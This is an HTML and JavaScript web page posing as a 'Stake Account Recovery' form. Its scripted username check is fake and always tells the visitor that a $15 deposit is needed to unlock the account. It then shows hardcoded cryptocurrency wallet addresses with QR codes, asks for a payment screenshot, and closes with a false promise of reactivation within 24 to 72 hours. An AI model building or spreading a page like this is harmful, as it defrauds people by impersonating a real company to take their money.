<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Stake Account Recovery</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <style>
    /* ... [Your Existing CSS, Unchanged] ... */

    #qrcode {
      display: none;
      margin-top: 15px;
      text-align: center;
    }

    #qrcode canvas {
      border-radius: 8px;
    }

    #saveQRBtn {
      margin-top: 10px;
      background-color: #02dc05;
      color: #0f212e;
      font-weight: bold;
      padding: 8px 16px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    #saveQRBtn:hover {
      box-shadow: 0 0 10px #02dc05;
    }
  </style>
</head>
<body>
  <div id="main-content" class="container">
    <div class="header">
      <img src="stake-logo-white.png" alt="Stake Logo" />
      <h2>Account Recovery</h2>
    </div>

    <!-- Username Verification -->
    <div class="form-group">
      <label for="username">Username</label>
      <input type="text" id="username" placeholder="Enter Stake Username" />
      <button onclick="verifyUsername()">Verify</button>
      <div class="message" id="verify-msg"></div>
    </div>

    <!-- Coin Selection -->
    <div class="form-group">
      <label for="coin">Select Coin</label>
      <select id="coin" onchange="updateAddress()">
        <option value="">--Select Coin--</option>
        <option value="usdt">USDT</option>
        <option value="btc">BTC</option>
        <option value="trx">TRX</option>
        <option value="eth">Ethereum</option>
      </select>
    </div>

    <!-- Network Selection -->
    <div class="form-group">
      <label for="network">Select Network</label>
      <select id="network" onchange="updateAddress()">
        <option value="">--Select Network--</option>
        <option value="trc20">TRC20</option>
        <option value="bsc">BSC</option>
      </select>
    </div>

    <!-- Wallet Address + QR -->
    <div class="form-group">
      <label for="address">Wallet Address</label>
      <input type="text" id="address" readonly />
      <button class="copy-btn" onclick="copyAddress()">Copy</button>

      <!-- QR Code Display -->
      <div id="qrcode"></div>
      <div style="text-align:center;">
        <button id="saveQRBtn" onclick="saveQRCode()" style="display:none;">Save QR</button>
      </div>
    </div>

    <!-- Amount -->
    <div class="form-group">
      <label for="amount">Enter Amount (USD)</label>
      <input type="number" id="amount" />
    </div>

    <!-- Screenshot Upload -->
    <div class="form-group">
      <label for="screenshot">Upload Screenshot</label>
      <input type="file" id="screenshot" />
    </div>

    <!-- Submit -->
    <button id="submitBtn" onclick="submitForm()" disabled>Submit</button>
  </div>

  <!-- Popup -->
  <div id="popup">
    <p>Your account recovery request has been successfully received. We have forwarded your request to the Stake technical team for prompt action. Your Stake account will be fully reactivated within 24 to 72 hours.</p>
    <button onclick="location.reload()">OK</button>
  </div>

  <!-- QR Code Library -->
  <script src="https://cdn.jsdelivr.net/npm/qrcodejs/qrcode.min.js"></script>

  <!-- JS Logic -->
  <script>
    const addressMap = {
      usdt: {
        trc20: 'TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA',
        bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c'
      },
      btc: {
        bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c'
      },
      trx: {
        trc20: 'TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA',
        bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c'
      },
      eth: {
        bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c'
      }
    };

    function verifyUsername() {
      const msg = document.getElementById('verify-msg');
      msg.innerHTML = 'Verifying...';
      setTimeout(() => {
        msg.innerHTML = 'Your Stake account is currently restricted to withdrawal-only mode. To unlock full access, a minimum deposit of $15 is required. This amount will be safely credited to your Stake account, ensuring the security and protection of your funds.';
      }, 1500);
    }

    function updateAddress() {
      const coin = document.getElementById('coin').value;
      const network = document.getElementById('network').value;
      const addressField = document.getElementById('address');
      const qrContainer = document.getElementById('qrcode');
      const saveBtn = document.getElementById('saveQRBtn');

      if (coin && network && addressMap[coin] && addressMap[coin][network]) {
        const addr = addressMap[coin][network];
        addressField.value = addr;

        // Clear old QR
        qrContainer.innerHTML = '';

        // Generate new QR
        const qr = new QRCode(qrContainer, {
          text: addr,
          width: 150,
          height: 150,
          colorDark: "#ffffff",
          colorLight: "#0f212e",
          correctLevel: QRCode.CorrectLevel.H
        });

        qrContainer.style.display = 'block';
        saveBtn.style.display = 'inline-block';
      } else {
        addressField.value = '';
        qrContainer.style.display = 'none';
        saveBtn.style.display = 'none';
      }

      checkForm();
    }

    function copyAddress() {
      const address = document.getElementById('address');
      address.select();
      address.setSelectionRange(0, 99999);
      navigator.clipboard.writeText(address.value);
      alert('Address copied!');
    }

    function checkForm() {
      const username = document.getElementById('username').value;
      const coin = document.getElementById('coin').value;
      const network = document.getElementById('network').value;
      const address = document.getElementById('address').value;
      const amount = document.getElementById('amount').value;
      const screenshot = document.getElementById('screenshot').files.length;
      const btn = document.getElementById('submitBtn');
      btn.disabled = !(username && coin && network && address && amount && screenshot);
    }

    document.querySelectorAll('input, select').forEach(input => {
      input.addEventListener('change', checkForm);
    });

    function submitForm() {
      document.getElementById('main-content').classList.add('blur');
      document.getElementById('popup').style.display = 'block';
    }

    function saveQRCode() {
      const qrCanvas = document.querySelector("#qrcode canvas");
      const link = document.createElement("a");
      link.href = qrCanvas.toDataURL("image/png");
      link.download = "wallet-qr.png";
      link.click();
    }
  </script>
</body>
</html>
